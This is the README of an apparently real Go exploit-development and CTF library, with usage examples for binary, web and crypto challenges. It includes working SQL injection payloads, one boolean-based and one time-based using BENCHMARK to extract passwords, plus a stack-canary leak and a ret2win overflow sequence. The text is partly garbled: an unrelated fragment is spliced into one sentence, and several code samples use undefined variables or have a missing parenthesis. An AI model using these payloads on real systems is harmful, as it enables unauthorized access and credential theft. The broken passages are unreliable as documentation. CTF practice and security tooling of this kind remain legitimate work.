Pwngears is a CTF framework and exploit development library based on pwntools. It aims to provide an improved API and better error handling while adding more functionnalities regarding challenges other than binary exploitation. It also aims to provide its core package without any external dependencies, leveraging the Go standard library. 

## Why Go? And why make an alternative to Pwntools?
- Compiles into a static binary, eliminating risk of an exploit not working on somebody else version of the python interpreter. Also has easy cross compilation.
- Good performance and cheap goroutines allows for easy and quick byte-by-bytes leaks, length leaks and blind SQLI.
- The Go standard library provides all the tooling to make this library possible. This eliminates the dependency on other libraries the same way pwntools requires.
- Strong static typing helps prevents inattention errors during the writing of your exploit.
- Compare to other great compiled language, Go also provide good developer velocity with a clear and concise syntax.

## Exclusive features that are not included in Pwntools
- Proper web support. The web package will allow you to built your exploit to be sent over the web easily, while also providing more advanced function to prevent a lot of boilerplate code.
- Cryptography support. The crypto package will make it simple to encrypt, decrypt but also brute-force some encryption and cyphers. This package makes use of goroutines to allow the usage of all your CPU cores for better decryption performance.
- Wordlist and premade payloads. A lot of common payloads are embbeded to make it easy to build injections and other payloads.
- CLI tools to run some useful commands without building a go project. Allows encryption and decryption directly from the command line as well as other useful commands for CTF challenges.

## Upcoming features
- [x] Possibility to opt in and out of error returns and instead use a logger
- [x] Cryptography support
- [ ] ELF support
- [ ] Exploit skeleton builder for quick setup with necessary packages
- [ ] GPU accelerated brute forcing
- [ ] Image layer analysis

## Quick Showcase
```go
// --------------------------------------
// -------- BINARY EXPLOITATION ---------
// --------------------------------------
p := Process("./supersecure")
defer p.Close()

p.SendLineAfter("Name: ", "Arthur")
response := p.RecvLineString()

exploit := NewExploit(r)
exploit.SetConnectFunc(func() pwn.Tube {
	conn := Connect("127.0.0.1", 12069)
	p.SendLine("Arthur")
	return conn
})

canary := exploit.LeakCanary(40, func(tube pwn.Tube) bool {
	resp := tube.RecvLine()
	return Contains(resp, "Saved")
})

retAddr := exploit.LeakAddress(40, canary, 8, func(tube pwn.Tube) bool {
	resp := tube.RecvLine()
	return Contains(resp, "Saved")
})

pieBase := retAddr - 0x1811
winAddr := pieBase + 0x12e9

payload := Pay().
	PadTo(40).
	Canary(canary).
	Repeat("B", 8).
	P64(winAddr).
	SendWithSize(r).
	Send(response)

r.SendPayload(payload)

key := r.RecvAllString(3 * time.Second)

// --------------------------------------
// --------------- WEB ------------------
// --------------------------------------
conn := Conn("http://some-ctf-website.com")

resp := conn.Get("/search",
	WithParam("query", "admin"),
	WithHeader("Content-Type", "application/json"),
	WithCookie("admin-key", key))

var pass string
passPattern := regexp.MustCompile(`pass: (.*)`)
for _, line := range resp.Lines() {
	pass = pattern.FindStringSubmatch(line)[1]
}

form := NewForm()
form.Set("username", "admin")
form.Set("pass", pass)
loginResp := conn.Post("/login", form)

encryptedflagPattern := regexp.MustCompile(`secret-encrypted-flag:(.*)\n`)
encryptedFlag := flagPattern.FindStringSubmatch(line)[1]
// --------------------------------------
// ------------ CRYPTOGRAPHY ------------
// --------------------------------------

engine := NewCryptoEngine()

xorLower := XORCipher{
	KeyAlphabet: []byte("abcdefghijklmnopqrstuvwxyz123456789"),
}

results := engine.BruteForce(xorLower, cypher,
	WithMaxKeyLength(8),
	WithFindAllPossibleKeys(false),
	WithPatternPrefix("PWNGEARS{"),
	WithPatternSuffix("}"),

for _, r := range results {
	fmt.Printf("[%s] key=%q\n%s\n", r.Cipher, r.Key, r.Plaintext)
}
```

## Installation
```sh
go get github.com/tonythetender/pwngears
```
Pwngears uses a hierarchy of different packages detached from the core package which allows you to only import what you need for the current exploit. For example, if you're doing a web challenge you wont need functions relating to binary exploitation. As such you can decide only import whats needed for web challenges. 

```go
import "github.com/tonythetender/pwngears/web"
```
If you need to do bruteforcing, you can decide to also import the core bruteforcing package and its web components. 
```go
import (
	"github.com/tonythetender/pwngears/web"
	"github.com/tonythetender/pwngears/bruteforce"
	"github.com/tonythetender/pwngears/bruteforce/bfweb"
)

```
This allows for a more focused API for the user needs. This also means that if some external dependencies are added in the future, those can be plugins that the user won't need to include in their binaries if they're not being used.
## Basic Syntax

> [!NOTE]
> For the purpose of writing more compact code and because exploit dont normally involve a ton of other imports, we'll be using the `.` notation on imports. If you want to import other libraries or write your own functions that conflict with pwngears exported function, feel free to use more explicit import. 

### Errors returns or logging
This framework provides 2 different ways to open a connection. The methods attached to the connection will act the same but their return values will vary depending on the connection chosen. Because exploits shouldn't be more verbose than they need to be, the user can opt to not have errors returned from any methods. Instead a logger is used. This is the default connection.

```go
conn := Conn("http://some-ctf-website.com")
resp := conn.Get("/")
```

While the default log level is `INFO`, the user can also set a custom logger by passing a logger to the connection constructor. The user can customized their own slog logger or use the default logger constructor with the chosen log level.
```go
logger, _ := NewDefaultLogger("DEBUG")
conn := ConnWithLogger("http://some-ctf-website.com", logger)
resp := conn.Get("/")
```

or
```go
conn := Conn("http://some-ctf-website.com")
conn.SetLogLevel("ERROR")
resp := conn.Get("/")
```
By default, the program will stop when an error is encountered. You can modify this behavior with the following function.
```go
conn.SetFailOnError(false)
```

The second way is with the more idiomatic, but verbose Go errors return. When opening the connection with the following function, all the methods will return an error value, except when it doesnt apply. You can then decide how to handle the error.
```go
conn, err := ConnWithErrors("http://some-ctf-website.com")
if err != nil {
	log.Fatalf("Connection couldn't be established: %v", err)
}
resp, err := conn.Get("/")
if err != nil {
	log.Fatalf("Error during GET request: %v", err)
}
```
> [!NOTE]
> The example given above are with the web connection, but they all work the same way with process and remote connections, as well as other constructors like the bruteforcer. Just replace `Conn` with `Process` or `Remote`. From here on out, to keep the documentation concise, the connection with the logger will be used.
        
### Web
You'll first need to import the web package.
```go
import (
	. "github.com/tonythetender/pwngears"
	. "github.com/tonythetender/pwngears/web"
)
```

This connection will hold at users should know, even when skimming content.track of things like cookies and headers while also making sure the connection doesn't timeout or redirect indefinitely.

From there you can make GET request simply like this :
```go
resp := conn.Get("/")

fmt.Println(resp.Text())
```

You can also add query directly in the string or by adding parameters
```go
resp := conn.Get("/search",
	WithParam("category", "shoes"),
	WithParam("color", "blue"),
	WithParam("size", "9"))

```
You can add headers or cookies the same way, one at a time or in bulk.
```go
resp := conn.Get("/search",
	WithHeader("Content-Type", "application/json"),
	WithCookie("session", "abc123"))

resp := conn.Get("/admin",
	WithHeaders(map[string]string{"X-Forwarded-For": "127.0.0.1"}),
	WithCookies(map[string]string{"role": "admin"}))
```
Authentication options are also available.
```go
resp := conn.Get("/api", WithBearer(token))
resp := conn.Get("/api", WithBasicAuth("admin", "admin"))
```

To send a POST request, `PostForm` is the quickest way. You can pass the fields as key/value pairs, as a `Fields` map, or mix in request options.
```go
resp := conn.PostForm("/login", "username", "admin", "password", "hunter2")

resp := conn.PostForm("/login", Fields{
	"username": "admin",
	"password": "hunter2",
})

resp := conn.PostForm("/login", Fields{"username": "admin"},
	WithHeader("X-CSRF-Token", token))
```
If you need multi-value fields or already have a `url.Values`, `Post` takes one directly.
```go
form := NewForm()
form.Add("tag", "a")
form.Add("tag", "b")
resp := conn.Post("/filter", form)
```
The other HTTP verbs are available too. `Put` and `Patch` take a form body like `Post`, while `Delete`, `Head` and `Options` take only options.
```go
conn.Put("/item/1", Fields{"name": "updated"})
conn.Delete("/item/1")
conn.Head("/large-file")
```

### JSON
When a challenge expects a JSON body instead of a form, use `PostJSON`. It accepts a struct, a map, or raw `string`/`[]byte`, and sets the `application/json` content type for you.
```go
resp := conn.PostJSON("/api/login", map[string]any{
	"username": "admin",
	"id":       1,
})
```
For a hand-crafted body that is neither a form nor JSON, `PostRaw` sends a `string` or `[]byte` as-is and leaves the content type to you.
```go
resp := conn.PostRaw("/api", `{"id":1}`, WithContentType("application/json"))
resp := conn.PostRaw("/upload", rawBytes, WithContentType("application/octet-stream"))
```
You can also keep the body or the form fields in a file and load them at runtime. `LoadFields` reads a JSON object into form fields (sent url-encoded, like a normal form), while `LoadJSON` reads a file to send as a raw JSON body.
```go
resp := conn.PostForm("/login", LoadFields("login.json"))
resp := conn.PostJSON("/api", LoadJSON("payload.json"))
```
To read a JSON response back, pass a pointer to `JSON`.
```go
var out struct {
	Token string `json:"token"`
}
resp.JSON(&out)
fmt.Println(out.Token)
```

### One-off requests
For a quick probe you don't need to build a connection first. The package-level `Get`, `Post`, `PostForm`, `PostJSON` and `PostRaw` take a full URL, fire a single request and return the response.
```go
resp := Get("http://some-ctf-website.com/robots.txt")
resp := PostForm("http://some-ctf-website.com/login", Fields{"user": "admin"})
resp := PostJSON("http://some-ctf-website.com/api", map[string]any{"id": 2})
```
Each call opens its own throwaway connection, so cookies are not kept between them. For a multi-step flow (such as logging in and then scraping) use a `Conn` instead.

### Reading responses
The response gives you a few helpers to avoid writing regexes by hand. `Match` returns the first capture group (or the whole match if there is no group), while `MatchAll` returns every match.
```go
resp := conn.Get("/profile")

pass := resp.Match(`password: (\w+)`)
tokens := resp.MatchAll(`token=(\w+)`)
flag := resp.Flag("FLAG")
```
> [!NOTE]
> With the default (logger) connection, `Match` and `Flag` stop the program if nothing matches, since you usually expect the value to be there. Use `SetFailOnError(false)` to instead get an empty result, or use the error-returning connection. `MatchAll` never fails on zero matches.

You can also inspect the status, headers and cookies directly.
```go
if resp.OK() {            // status in the 2xx range
	// ...
}
resp.Is(302)              // status code equals
resp.Location()           // Location header
resp.Cookie("session")    // value of a response cookie by name
resp.Text()               // body as a string
resp.Lines()              // body split into lines
resp.Contains("admin")    // substring check on the body
```

### Binary exploitation
You'll first need to import the process package.
```go
import . "github.com/tonythetender/pwngears/process"
```
To do binary exploitation (ie pwning and reverse) you can connect to a process either localy through an executable
```go
conn := Process("./command")
defer conn.Close()
```
You can pass command-line arguments directly. To set environment variables (for example to load a specific libc with `LD_PRELOAD`), use `ProcessWith`.
```go
p := Process("./command", "arg1", "arg2")

p := ProcessWith("./command",
	WithArgs("arg1"),
	WithEnv(map[string]string{"LD_PRELOAD": "./libc.so.6"}),
)
```
Or through a tcp connection
```go
r := Remote("127.0.0.1", 12069)
```
With the possibility of SSL/TLS over TCP. Self-signed certificates are accepted by default, since CTF servers typically use them.
```go
r := Remote("127.0.0.1", 12069, SSL())
```
You can set a specific SNI or enforce proper certificate verification.
```go
r := Remote("127.0.0.1", 12069, SSL(), WithSNI("chal.ctf"))
r := Remote("127.0.0.1", 12069, SSL(), WithVerifyCert(true))
```
You can then send inputs directly to the process. The library takes care of converting the string to bytes, but you can also explicitly send bytes to it. Those wont be converted again.
```go
r.SendLine("shellcode")
r.SendLine([]byte("shellcode"))
```
You can also send an input after the process as output a certain line
```go
r.SendLineAfter("Name: ", "John")
```

## Advanced Syntax

### Web
A lot of challenge will require you to iterate over alphanumeric character in order to find the next missing character. For example, when doing SQL injection, you might get a feedback if the start of your input is correct so you need to iterate over every character until you find the whole input. Using the integrated BruteForcer makes this simple.
```go
import (
	. "github.com/tonythetender/pwngears/bruteforce"
	. "github.com/tonythetender/pwngears/web"
)

func BruteForceFormExample(ctf *web.WebConn) string {
	conn := Conn("http://some-ctf-website.com")

	exploit := NewBruteforcer()
	// Multiple charset options are available but you can also pass a custom
	// string that will be used as the charset
	exploit.Charset = GenerateCharset("alphanumeric", "special")
	exploit.MaxLength = 24
	exploit.Delay = 50 * time.Millisecond

	// Different bruteforcer are available, here we use PostRequestBf
	// for bruteforcing a form sent through a POST request
	password := exploit.CharByChar(`admin' AND password like '`, `%' --`, PostRequestBf(
		conn.Client,
		"/login",
		"username",
		// For every attempt, the bruteforcer will make sure this field is filled
		AlsoFillFormField("password", "Joe"),
		// The input will be consider valid if the following two conditions are true
		WithoutBodyContains("invalid"),
		WithResponseCode(200),
	))
	return password
}
```
### Time-based SQLI
Lets say your SQLI doesn't provide you with proper response telling you if your query is correct. Different database provide way to make the query take longer in the event that the query is true. Lets say youre trying to find the password of the user id 1 by sleeping when the character is correct. You can make it so that if the response takes above 3 seconds, it counts as valid.
```go
func BruteForceFormExample(conn *web.WebConn) string {
	exploit := NewBruteforcer()
	exploit.Charset = GenerateCharset("digits")
	exploit.MaxLength = 10

	prefix := `1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(`
	suffix := `),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;`

	password, _ := exploit.CharByChar(prefix, suffix, PostRequestBf(
		conn.Client,
		"/login",
		"username",
		web.WithResponseTimeAbove(3 * time.Second),
	))
	return password
}

```

### Binary Exploitation
Some function were added to facilitate the process of leaking a canary or and address. You can set up your exploit like this
```go
exploit := NewExploit(r)
exploit.SetConnectFunc(func() pwn.Tube {
	conn := Remote("127.0.0.1", 12069)
	r.SendLine("Arthur")
	return conn
})

canary := exploit.LeakCanary(40, func(tube pwn.Tube) bool {
	resp := tube.RecvLine()
	// The character is correct when the "Saved" line is displayed
	return Contains(resp, "Saved")
})

retAddr := exploit.LeakAddress(40, canary, 8, func(tube pwn.Tube) bool {
	resp := tube.RecvLine()
	return Contains(resp, "Saved")
})

pieBase := retAddr - 0x1811
winAddr := pieBase + 0x12e9

Pay().
	PadTo(40).
	Canary(canary).
	Repeat("B", 8).
	P64(winAddr).
	SendWithSize(r)
```
